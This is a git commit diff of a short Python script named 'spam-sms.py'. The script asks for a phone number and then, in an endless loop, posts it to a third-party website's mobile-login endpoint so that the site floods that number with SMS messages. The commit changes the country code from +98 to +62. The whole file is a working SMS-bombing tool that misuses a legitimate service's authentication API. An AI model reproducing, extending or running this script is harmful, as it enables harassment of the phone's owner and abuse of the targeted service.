e35a5ca2052b1eed257fb3657499e5e734a037fd
ChiLi_Cyber <42003452+ChiLiCyber@users.noreply.github.com>
2021-05-19 21:28:08 +0700

    Update spam-sms.py

--- spam-sms.py
+++ spam-sms.py
@@ -3,7 +3,7 @@ import time
 phonenum = input("Enter The Phone Number :")
 
 urlsend = "https://www.shab.ir/api/fa/sandbox/v_1_4/auth/enter-mobile"
-mydata = {"mobile":"+98"+phonenum} 
+mydata = {"mobile":"+62"+phonenum} 
 
 while True :
      requests.post(urlsend,data=mydata)
